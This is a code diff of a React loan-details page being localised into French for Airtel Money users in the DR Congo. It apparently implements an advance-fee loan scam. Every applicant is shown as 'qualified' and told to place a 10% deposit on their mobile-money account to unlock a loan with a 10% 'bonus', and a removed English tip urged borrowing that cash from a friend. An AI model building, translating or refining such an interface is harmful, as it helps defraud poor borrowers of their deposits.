@@ -121,12 +121,10 @@ interface LoanDetailsPageProps {
 
 export default function LoanDetailsPage({
     onBack,
-    userName = "shadowbrokers",
-    AirtelCongoAccount = "0734765678",
+    userName = "Client",
+    AirtelCongoAccount = "0991234567",
     loanAmount = 109
 }: LoanDetailsPageProps) {
-    // User requests loanAmount, needs to deposit 10% of that
-    // Then receives loanAmount + 10% bonus
     const requestedAmount = loanAmount;
     const requiredDeposit = (requestedAmount * 0.1).toFixed(2);
     const loanWithBonus = (requestedAmount * 1.1).toFixed(2);
@@ -142,7 +140,7 @@ export default function LoanDetailsPage({
                 >
                     <ArrowLeft size={24} />
                 </button>
-                <h1 style={titleStyle}>Loan Details</h1>
+                <h1 style={titleStyle}>Détails du Prêt</h1>
             </div>
 
             <div style={cardStyle}>
@@ -150,7 +148,7 @@ export default function LoanDetailsPage({
                 <div style={infoRowStyle}>
                     <div style={labelStyle}>
                         <User size={14} style={{ display: "inline", marginRight: "6px" }} />
-                        Name
+                        Nom
                     </div>
                     <div style={valueStyle}>{userName}</div>
                 </div>
@@ -158,7 +156,7 @@ export default function LoanDetailsPage({
                 <div style={infoRowStyle}>
                     <div style={labelStyle}>
                         <Smartphone size={14} style={{ display: "inline", marginRight: "6px" }} />
-                        Airtel Congo Account
+                        Compte Airtel Money RDC
                     </div>
                     <div style={valueStyle}>{AirtelCongoAccount}</div>
                 </div>
@@ -167,7 +165,7 @@ export default function LoanDetailsPage({
                 <div style={highlightBoxStyle}>
                     <div style={labelStyle}>
                         <DollarSign size={14} style={{ display: "inline", marginRight: "6px" }} />
-                        Requested Loan Amount
+                        Montant du Prêt Demandé
                     </div>
                     <div style={{
                         fontSize: "28px",
@@ -182,7 +180,7 @@ export default function LoanDetailsPage({
                 {/* Required Deposit */}
                 <div style={infoRowStyle}>
                     <div style={labelStyle}>
-                        Required Deposit (10%)
+                        Dépôt de Garantie Requis (10%)
                     </div>
                     <div style={valueStyle}>${requiredDeposit}</div>
                 </div>
@@ -190,7 +188,7 @@ export default function LoanDetailsPage({
                 {/* Loan Amount with Bonus */}
                 <div style={infoRowStyle}>
                     <div style={labelStyle}>
-                        Total Amount (with 10% bonus)
+                        Montant Total (avec bonus 10%)
                     </div>
                     <div style={valueStyle}>${loanWithBonus}</div>
                 </div>
@@ -199,7 +197,7 @@ export default function LoanDetailsPage({
                 <div style={{ textAlign: "center", marginTop: "24px" }}>
                     <div style={qualifiedBadgeStyle}>
                         <CheckCircle size={16} style={{ display: "inline", marginRight: "6px", verticalAlign: "middle" }} />
-                        Qualified
+                        Éligible & Qualifié
                     </div>
                 </div>
 
@@ -215,14 +213,14 @@ export default function LoanDetailsPage({
                         gap: "6px",
                     }}>
                         <Info size={16} />
-                        Tip
+                        Conseil
                     </div>
                     <div style={{
                         fontSize: "13px",
                         color: "#1976d2",
                         lineHeight: "1.6",
                     }}>
-                        To use your loan funds, ensure your Airtel Congo account has at least 10% of the loan amount as a deposit. If needed, ask a friend to send you the cash, then return it after qualification.
+                        Pour débloquer et retirer vos fonds, veillez à maintenir le dépôt de garantie de 10% sur votre compte Airtel Money RDC.
                     </div>
                 </div>
 
@@ -239,7 +237,7 @@ export default function LoanDetailsPage({
                     }}
                 >
                     <ArrowLeft size={20} />
-                    Back to Loan Summary
+                    Retour au Récapitulatif
                 </button>
             </div>
         </div>
